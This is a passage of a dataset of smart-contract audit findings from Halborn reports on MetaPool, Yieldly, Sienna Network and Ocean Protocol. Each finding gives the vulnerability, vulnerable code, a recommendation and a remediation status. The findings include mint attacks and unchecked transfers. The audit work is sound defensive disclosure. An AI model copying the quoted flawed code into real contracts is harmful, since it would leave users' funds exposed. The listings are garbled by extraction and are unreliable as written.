        "body": "Multiple gas cost optimization opportunities were identified in the loops of scoped contracts:  Unnecessary reading of the array length on each iteration wastes gas.  Using != consumes less gas.  It is possible to further optimize loops by using unchecked loop index incrementing and decrementing.  Pre-increment ++i consumes less gas than post-increment i++. Code Location: Listing 15: contracts/Staking.sol 121 for ( uint i = 0; i < addresses . length ; i ++) Listing 16: contracts/Staking.sol 128 for ( uint i = 0; i < addresses . length ; i ++) Listing 17: contracts/Staking.sol 219 for ( uint i = 0; i < nodesLength ; i ++) BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) 32 Recommendation: It is recommended to cache array lengths outside of loops, as long the size is not changed during the loop. It is recommended to use the unchecked ++i operation to increment the It is noted that using values of the uint variable inside the loop. unchecked operations requires particular caution to avoid overflows, and their use may impair code readability. It is possible to save gas by using != inside loop conditions. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  09e5810f590ecb890d914b42bfe6f7d8d085643a. 33 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Smart contracts in metapool-ethereum use the floating pragma ^0.8. Con- tracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to en- sure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Risk Level: Likelihood - 0 Impact - 0 Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use version by removing the caret (^) symbol. floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  f75a74db30d6ad74b7f78af95aabecde315967aa. 34 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "TYPOS IN COMMENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It has been identified that some comments contain typos. Although it is a comment, fixing it is recommended to improve code quality and readability in order to avoid confusions. Code Location: Listing 18: contracts/Staking.sol (Line 160) 160 // / @notice Update Withdrawal contract address 161 // / @dev Updater function 162 // / @notice Updates nodes total balance 163 // / @param _newNodesBalance Total current ETH balance from  validators 164 function updateNodesBalance ( uint _newNodesBalance ) external  onlyRole ( UPDATER_ROLE ) { BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: If possible, consider removing the Update Withdrawal comment. Remediation Plan: SOLVED: The MetaPool team solved the issue in the following commit ID:  2150d0bf5d3cd8194bf03802d64b2e7a6cb1526c. 35 ",
        "labels": [
            "Halborn",
            "MetaPool_ETH_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF MULTISIG PROGRAM",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "The principal benefit of multisig is that it creates added redundancy in key management. While single signature addresses require only a single key for transactions, multisignature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 14 Example Definition: Listing 1: Multisig Implementation (Lines ) 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 3 Recommendation: In the contract, The multi-signature should be implemented over a creator account. Remediation Plan: SOLVED: Yieldly.Finance Team will monitor assets by a multi-signature address. 15 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions But, in the some of functions transactions dont go tied with proxy. through the Proxy asset. Code Location: Listing 2: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 3: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); Risk Level: Likelihood - 2 Impact - 2 16 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: SOLVED: Yieldly.Finance Team applied the necessary changes to communicate through the proxy. 17 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING FREEZE/REVOKE ASSETS DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "When an asset is created, the contract can provide a freeze address and a defaultfrozen state. If the defaultfrozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks prior to ownership. (KYC/AML) The clawback address, if specified, is able to revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. Code Location: Risk Level: Likelihood - 1 Impact - 1 18 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. SOLVED: Yieldly.Finance Team confirmed the assets dontt have freeze/ clawback addresses. 19 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "MULTIPLE PRAGMA DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "It has been observed that different versions of the pragma are used on TEAL contracts. The pragma on the ESCROW contract is defined as 2. Code Location: Listing 4: Pragma Version 2 Functions (Lines ) 2 reward_fund_escrow . teal 3 reward_fund_close . teal 4 reward_fund_rates . teal 5 reward_fund_tracker . teal Risk Level: Likelihood - 1 Impact - 1 Recommendation: A common version of pragma (3) should be used across all contracts to avoid an unexpected workflows. SOLVED: Yieldly.Finance Team updated pragma version on the related con- tracts. 20 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "ALERTHUB SETUP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Lottery_Algorand_Smart_Contract_Halborn_v1_1.pdf",
        "body": "AlertHub is a tool that provides monitoring and real-time alerts on Algorand addresses so that users may manage the security of their accounts and the wider Algorand network. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to setup alerthub for real-time monitoring. help the operations proceed healthily and safely. It can SOLVED: Yieldly.Finance Team will set up Alerthub on the mainnet. 21 3.6 TESTING ACCESS CONTROL POLICIES ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Lottery_Algorand_Halborn_v1_1",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBILITY TO CREATE POOLS WITH THE SAME PAIR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The AMM module allow users to create pairs (called exchanges) from native or custom assets by calling create_exchange function on factory contract. It relies on the token_type PartialEq implementation, that allows users to pair the same asset twice, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool. The verification asserts that both tokens addresses are not exactly equal, but a lowercase version of the address will be considered different from the uppercase one. Code Location: Listing 1: libraries/amm-shared/src/token_type.rs (Line 32) 26 impl <A : PartialEq > PartialEq for TokenType <A > { 27 fn eq (& self , other : & Self ) -> bool { 28 29 30 match ( self , other ) { ( Self :: CustomToken { contract_addr : l_contract_addr , .. }, Self :: CustomToken { contract_addr : r_contract_addr , .. } ) => l_contract_addr == r_contract_addr , ( Self :: NativeToken { denom : l_denom }, Self :: NativeToken { denom : r_denom } ) => l_denom == r_denom , _ => false 31 32 33 34 35 36 37 38 39 40 } } } 13 Risk Level: Likelihood - 4 Impact - 4 Recommendation: The PartialEq implementation for TokenType must be able to compare custom tokens correctly, taking the case into account. Remediation plan: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding. 14 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "EXCHANGE SWAP FEES ARE NOT STABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The exchange contract allows users to perform swaps between different assets, and comes with a predefined swap fee that capture part of the input amount and leaves it in the pool. However, that captured amount is not considered when performing the swap. To better explain this situation, we take a scenario with little liquidity:  Alice offers 1000 A to a (1000 A; 1000 B) pool with 0.3% swap fees.  3 A are captured from the offer, and the swap is performed on the (1000 A; 1000 B) pool with 997 A instead of a (1003 A; 1000 B) pool. This realizes the swap on a 1997 total A pool instead of 2000 A pool: 1) Without fee:  returned = 1000B - (1000A * 1000B)/ (1000A + 1000A)= 500B  balance after swap: 2000A, 500B 2) Excluding the fee from the pool (current scenario):  returned = 1000B - (1000A * 1000B)/ (1000A + 997A)= 499.25B  balance after swap: 2000A, 500.75B  commission: (500 - 499.25)/500 = 0.15% 3) Including the fee to the pool:  returned = 1000B - (1003A * 1000B)/ (1003A + 997A)= 498.5B  balance after swap: 2000A, 501.5B 15  commission: (500 - 498.5)/500 = 0.3% With a 0.3% commission, the user should receive 500B * (1-0.3%)= 498.5B, but the current scenario uses in fact a fee of 0.15%, that is function of the liquidity in the pool. The protocol is therefore failing to capture the wanted amount of commission, at expenses of the pool. Code Location: Listing 2: contracts/amm/exchange/src/contract.rs (Lines 676,680,684) // If not a simulation , need to subtract the incoming amount // from the pool offer_pool = ( offer_pool - offer . amount ) ?; 673 if !is_simulation { 674 675 676 677 } 678 let total_commission = swap_commission + sienna_commission ; 679 let offer_amount = ( offer . amount - total_commission ) ?; 680 Ok ( SwapInfo { 681 682 683 684 total_commission , swap_commission , sienna_commission , result : compute_swap ( offer_pool , balances [ token_index ^ 1] , offer_amount )? , 685 }) Risk Level: Likelihood - 3 Impact - 2 Recommendation: Include the retained commission within the offer_pool of swap computation, or only apply the fee on the returned amount. 16 Remediation plan: RISK ACCEPTED: The Sienna.Network team accepted the risk of this finding and also stated that fees should be deducted from the input amount as a business decision. 17 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "DATA LEAKAGE ATTACKS BY ANALYZING METADATA OF CONTRACTS USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Depending on a contracts implementation, an attacker could deanonymize In all the following information about the contract and its clients. scenarios, assume that an attacker has a local full node in its control. For example, it is possible for an attacker to create a list of every account that performs a swap. This attack is based on the length of the (encrypted) message sent to the attackers node: there is a significant difference of size between the only two queries. On one side, pair_info is short and doesnt take any parameter. On the other side, swap_simulation is longer and takes a parameter. This means that the inputs for queries on this contract would look like: \"pair_info\" {\"swap_simulation\": {\"offer\": some data}} Therefore, the attacker (a validator node or internet provider) can distinguish what query was called given the length of the message. If the message is long, the user might have asked for a swap simulation and could perform a swap transaction after that. Code Location: Listing 3: contracts/amm/exchange/src/contract.rs (Lines 182,202) 180 pub fn query <S : Storage , A : Api , Q : Querier >( deps : & Extern <S , A , Q >, msg : QueryMsg ) -> QueryResult { match msg { QueryMsg :: PairInfo => { let config = load_config ( deps ) ?; 181 182 183 184 18 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 } let balances = config . pair . query_balances ( & deps . querier , config . contract_addr , config . viewing_key .0 , ) ?; let total_liquidity = query_liquidity (& deps . querier , & config . lp_token_info ) ?; to_binary (& QueryMsgResponse :: PairInfo { liquidity_token : config . lp_token_info , factory : config . factory_info , pair : config . pair , amount_0 : balances [0] , amount_1 : balances [1] , total_liquidity , contract_version : CONTRACT_VERSION , }) } QueryMsg :: SwapSimulation { offer } => { let config = load_config ( deps ) ?; to_binary (& swap_simulation ( deps , config , offer ) ?) } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider applying remediation from the SCRT privacy model (same length in function names, outputs, same state accessing orders. . . ) Remediation plan: ACKNOWLEDGED: The Sienna.Network team acknowledged this finding. 19 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISMATCH BETWEEN ASSERTION AND ERROR DESCRIPTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the exchange contract, the description of the slippage check and the code do not match:  Description explains that slippage tolerance must be bewteen 0.1 and 0.9.  Verification ensures that slippage is contained between 0 and 1 excluded. The confusion between the code and the description could confuse users interacting with the contract. Code Location: Listing 4: contracts/amm/exchange/src/contract.rs (Lines 741,743) 741 if slippage . is_zero () || slippage >= Decimal256 :: one () { 742 743 return Err ( StdError :: generic_err ( format! (\" Slippage tolerance must be between 0.1 and 0.9 , got : {} \" , slippage )) 744 745 } ); Risk Level: Likelihood - 1 Impact - 1 20 Recommendation: Either change the code, or the error description, so that both are matching. Remediation plan: ACKNOWLEDGED: The Sienna team acknowledged this finding and also stated that if a mistake is made for whatever reason, it can quickly be corrected. 21 ",
        "labels": [
            "Halborn",
            "Sienna_Network_AMM_Protocol_Updated_Code_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MINT ATTACK AFTER NFT TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the FixedRateExchange and Dispenser contracts, users can transfer the ownership of NFT #1 to another user after having created a fixed rate exchange and dispenser instance. After transferring ownership, the roles were cleaned up; however, after the new owner created another fixed-rate exchange/dispenser instance, the original contract would once again have minting rights, allowing the first user to mint new tokens and collect base tokens. Code Location: The issues were present in the FixedRateExchange.sol and Dispenser.sol contracts. Risk Level: Likelihood - 5 Impact - 4 Recommendation: As this was due to the permissions set out in the fixed-rate exchange and dispenser contracts, the issue could be remediated by enforcing ownership of the accounts instead of the contract. Remediation Plan: SOLVED: The issue was fixed by the team after refactoring the permissions of the FixedRateExchanges and Dispenser contracts to accept as owners only the owner of NFT #1 and users with ERC20Deployer roles. 20 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: High"
        ]
    },
    {
        "title": "MINT ATTACK WITH WORTHLESS TOKEN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the FixedRateExchange contract, users can create a new fixed-rate exchange associated with a datatoken using a worthless ERC20 token as The attacker would be able to swap their tokens for the base token. datatokens and then sell the datatokens to the first exchange. Risk Level: Likelihood - 5 Impact - 4 Recommendation: Since this was because any user could create a new fixed rate exchange, the issue could be solved by restricting unauthorized users from creating a fixed rate exchange. Remediation Plan: SOLVED: The issue was fixed by the team after refactoring the creation of the fixed-rate exchange functionality to only allow users with the role ERC20Deployer or the owner of NFT #1. 21 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: High"
        ]
    },
    {
        "title": "DT TOKEN STAKE NOT CALCULATED SUCCESSFULLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Within the BPool contract, the order of instructions resulted in wrong calculations. After the users called the joinSwapExternAmountIn function, calculations were made on the provided supply and the pool share was minted. Later, the side staking bot (ssBot) would provide their share. However, the calculations were made on the totalSupply without taking into account that this would have changed after the shares were minting. This ultimately resulted in miscalculations in the future. Code Location: The issue was present in the Bpool.sol contract on line 1053, 1064 and 1042. Listing 1 ) external _lock_ returns ( uint256 poolAmountOut ) { // tokenIn = _baseTokenAddress ; require ( _finalized , \" ERR_NOT_FINALIZED \"); _checkBound ( _baseTokenAddress ); require ( tokenAmountIn <= bmul ( _records [ _baseTokenAddress ]. \" ERR_MAX_IN_RATIO \" ); // ask ssContract Record storage inRecord = _records [ _baseTokenAddress ]; poolAmountOut = calcPoolOutGivenSingleIn ( function joinswapExternAmountIn ( uint256 tokenAmountIn , uint256 minPoolAmountOut 1 2 3 4 5 6 7 8 9  balance , MAX_IN_RATIO ) , 10 11 12 13 14 15 16 17 18 19 inRecord . balance , inRecord . denorm , _totalSupply , _totalWeight , 22 ); 20 21 22 23  ); 24 25 26 27  , block . timestamp ); 28 29 30 31 32  tokenAmountIn ); 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  ssAmountIn ); 49 50 51 52 53 54 55 56 57 58  ssAmountIn ); tokenAmountIn require ( poolAmountOut >= minPoolAmountOut , \" ERR_LIMIT_OUT \" inRecord . balance = badd ( inRecord . balance , tokenAmountIn ); emit LOG_JOIN ( msg . sender , _baseTokenAddress , tokenAmountIn emit LOG_BPT ( poolAmountOut ); _mintPoolShare ( poolAmountOut ); _pushPoolShare ( msg . sender , poolAmountOut ); _pullUnderlying ( _baseTokenAddress , msg . sender , // ask the ssContract to stake as well // calculate how much should the 1 ss stake Record storage ssInRecord = _records [ _datatokenAddress ]; uint256 ssAmountIn = calcSingleInGivenPoolOut ( ssInRecord . balance , ssInRecord . denorm , _totalSupply , _totalWeight , poolAmountOut ); if ( ssContract . canStake ( _datatokenAddress , ssAmountIn )) { // call 1 ss to approve ssContract . Stake ( _datatokenAddress , ssAmountIn ); // follow the same path ssInRecord . balance = badd ( ssInRecord . balance , emit LOG_JOIN ( _controller , _datatokenAddress , ssAmountIn , block . timestamp ); emit LOG_BPT_SS ( poolAmountOut ); _mintPoolShare ( poolAmountOut ); _pushPoolShare ( _controller , poolAmountOut ); _pullUnderlying ( _datatokenAddress , _controller , 23 59 60 61 } } return poolAmountOut ; Risk Level: Likelihood - 4 Impact - 4 Recommendation: The issue could be solved by minting shares, after the ssBot provides its part to ensure the correct totalSupply amount is considered in the calculations. Remediation Plan: SOLVED: Ocean protocol amended the affected lines to ensure that the totalSupply argument used in the calculations matched between the users staking data tokens and the side staking bot - GitHub pull request fix. 24 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: High"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the BPool.sol, contracts, SideStaking.sol, FactoryRouter.sol ERC20Tempalte.sol, Dispenser. In sol, and FixedRateExchange.sol, the return values of the external transfer calls are not checked. It should be noted that token is not reverted in case of failure and returns false. If one of these tokens is used, a deposit would not be reverted if the transfer fails, and an attacker could deposit tokens for free. OPFCommunityFeeCollector.sol Code Location: FactoryRouter Listing 2: FactoryRouter.sol (Lines 275,299) 262 263 264 265 266 267 268 269 270 function buyDTBatch ( Operations [] calldata _operations ) external { for ( uint i = 0; i < _operations . length ; i ++) { [ Redacted for brevity ] } else if ( _operations [ i ]. operation ==  operationType . SwapExactOut ){ 271  exact Out 272 273 // calculate how much amount In we need for uint amountIn = IPool ( _operations [ i ]. source ) . getAmountInExactOut ( _operations [ i ]. tokenIn ,  _operations [ i ]. tokenOut , _operations [i ]. amountsOut ); 274 275 // pull amount In from user IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , amountIn ); 276 277 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , amountIn ); 25 278 279 280 281 282 283 284 285 286 287 // perform swap IPool ( _operations [i ]. source ) . swapExactAmountOut ( _operations [i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // send amount out back to user require ( IERC20 ( _operations [i ]. tokenOut ) . transfer ( msg . sender , _operations [ i ]. amountsOut  ) , ' Failed MultiSwap '); 288 289 } else if ( _operations [ i ]. operation ==  operationType . FixedRate ) { 290 291 292 // get datatoken address (, address datatoken , , , , , , , , , ,) = IFixedRateExchange ( _operations [ i ]. source ).  getExchange ( _operations [i ]. exchangeIds ); 293 294 295 296 // get tokenIn amount required for dt out ( uint baseTokenAmount , , ,) = IFixedRateExchange ( _operations [ i ]. source ). calcBaseInGivenOutDT ( _operations [ i ].  exchangeIds , _operations [i ]. amountsOut ); 297 298 299 // pull tokenIn amount IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , baseTokenAmount ); 300 301 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , baseTokenAmount ); 302 303 304 // perform swap IFixedRateExchange ( _operations [ i ]. source ) . buyDT ( _operations [ i ]. exchangeIds , _operations [  i ]. amountsOut , _operations [ i ]. amountsIn ); 305 306 // send dt out to user IERC20 ( datatoken ). transfer ( msg . sender ,  _operations [ i ]. amountsOut ); 307 308 309 310 } else { IDispenser ( _operations [ i ]. source ) . dispense ( _operations [ i ]. tokenOut , _operations [  i ]. amountsOut , msg . sender ); 311 312 } 26 313 314 315 } } 27 Dispenser Listing 3: Dispenser.sol (Line 248) 236 237 238 239 240 241 242 243 244 245 246  ); 247 248 249  ); 250 251 function ownerWithdraw ( address datatoken ) external { require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. owner == msg . sender , ' Invalid owner ' ); IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance >0) { tokenInstance . transfer ( msg . sender , ourBalance ); emit OwnerWithdrawed ( datatoken , msg . sender , ourBalance } } Dispenser Listing 4: Dispenser.sol (Line 227) 187 function dispense ( address datatoken , uint256 amount , address  destination ) external payable { 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. active == true , ' Dispenser not active ' ); require ( amount > 0, ' Invalid zero amount ' ); require ( datatokens [ datatoken ]. maxTokens >= amount , ' Amount too high ' 28 203 204 205 206  , 207 208 209 210 211 212 ); if ( datatokens [ datatoken ]. allowedSwapper != address (0) ) { require ( datatokens [ datatoken ]. allowedSwapper == msg . sender \" This address is not allowed to request DT \" ); } IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 callerBalance = tokenInstance . balanceOf (  destination ); 213 214 215 216 217  ); 218  this ))){ 219 220 221 222 223 224 225 226 227 228 229 } require ( callerBalance < datatokens [ datatoken ]. maxBalance , ' Caller balance too high ' ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance < amount && tokenInstance . isMinter ( address ( // we need to mint the difference if we can tokenInstance . mint ( address ( this ) , amount - ourBalance ); ourBalance = tokenInstance . balanceOf ( address ( this )); } require ( ourBalance >= amount , ' Not enough reserves ' ); tokenInstance . transfer ( destination , amount ); emit TokensDispensed ( datatoken , destination , amount ); FixedRateExchange Listing 5: FixedRateExchange.sol (Lines 397,398,399,400) 394 395 } else { exchanges [ exchangeId ]. dtBalance = ( exchanges [  exchangeId ]. dtBalance ) 396 397  transfer ( 398 . sub ( dataTokenAmount ); IERC20Template ( exchanges [ exchangeId ]. dataToken ). msg . sender , 29 399 400 401 ); } dataTokenAmount FixedRateExchange Listing 6: FixedRateExchange.sol (Lines 477,478,479,480) 474 475 } else { exchanges [ exchangeId ]. btBalance = ( exchanges [  exchangeId ]. btBalance ) 476 477  transfer ( . sub ( baseTokenAmountBeforeFee ); IERC20Template ( exchanges [ exchangeId ]. baseToken ). 478 479 480 481 ); } msg . sender , baseTokenAmount FixedRateExchange Listing 7: FixedRateExchange.sol (Lines 500,501,502,503) 496 497 498 499 500 501 502 503 504 onlyExchangeOwner ( exchangeId ) { uint256 amount = exchanges [ exchangeId ]. btBalance ; exchanges [ exchangeId ]. btBalance = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); FixedRateExchange Listing 8: FixedRateExchange.sol (Lines 519,520,521,522) 515 516 517 518 { onlyExchangeOwner ( exchangeId ) uint256 amount = exchanges [ exchangeId ]. dtBalance ; exchanges [ exchangeId ]. dtBalance = 0; 30 519 520 521 522 523 IERC20Template ( exchanges [ exchangeId ]. dataToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); FixedRateExchange Listing 9: FixedRateExchange.sol (Lines 536,537,538,539) 532 533 function collectMarketFee ( bytes32 exchangeId ) external { // anyone call call this function , because funds are sent  to the correct address 534 535 536 537 538 539 540 uint256 amount = exchanges [ exchangeId ]. marketFeeAvailable ; exchanges [ exchangeId ]. marketFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. marketFeeCollector , amount ); emit MarketFeeCollected ( FixedRateExchange Listing 10: FixedRateExchange.sol (Lines 551,552,553,554) 548 // anyone call call this function , because funds are sent  to the correct address uint256 amount = exchanges [ exchangeId ]. oceanFeeAvailable ; exchanges [ exchangeId ]. oceanFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( opfCollector , amount ); emit OceanFeeCollected ( 549 550 551 552 553 554 555 SideStaking Listing 11: SideStaking.sol (Lines 350,351,352,353) 345 346 IERC20Template lPTokens = IERC20Template ( _datatokens [ datatokenAddress ]. poolAddress 31 347 348 349 350 351 352 353 354 ); uint256 lpBalance = lPTokens . balanceOf ( address ( this )) ; // uint256 balanceToTransfer = lpBalance . div (2) ; lPTokens . transfer ( _datatokens [ datatokenAddress ]. publisherAddress , lpBalance . div (2) ); } SideStaking Listing 12: SideStaking.sol (Line 390) 385 386  amount 387 388 389  . number ; ) { amount > 0 && _datatokens [ datatokenAddress ]. datatokenBalance >= IERC20Template dt = IERC20Template ( datatokenAddress ); _datatokens [ datatokenAddress ]. vestingLastBlock = block 390 dt . transfer ( _datatokens [ datatokenAddress ].  publisherAddress , amount ); 391 _datatokens [ datatokenAddress ]. datatokenBalance -= _datatokens [ datatokenAddress ]. vestingAmountSoFar +=  amount ; 392  amount ; 393 394 } } BPool Listing 13: BPool.sol (Line 257) 252 253 254 255 256 257 258 259 function collectOPF () external { address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = communityFees [ tokens [i ]]; communityFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( _opfCollector , amount ); } } 32 BPool Listing 14: BPool.sol (Line 268) 261 262 function collectMarketFee ( address to ) external { require ( _marketCollector == msg . sender , \" ONLY MARKET  COLLECTOR \"); 263 264 265 266 267 268 269 270 address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = marketFees [ tokens [i ]]; marketFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( to , amount ); } } Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or to ensure that the transfer return value is checked. Remediation Plan: SOLVED: The Ocean Protocol team amended the smart contracts to use the safeTransfer functions instead. 33 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: Medium"
        ]
    },
    {
        "title": "MULTIPLE EXTERNAL CALLS WITHIN LOOP MAY LEAD TO DENIAL OF SERVICE(DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
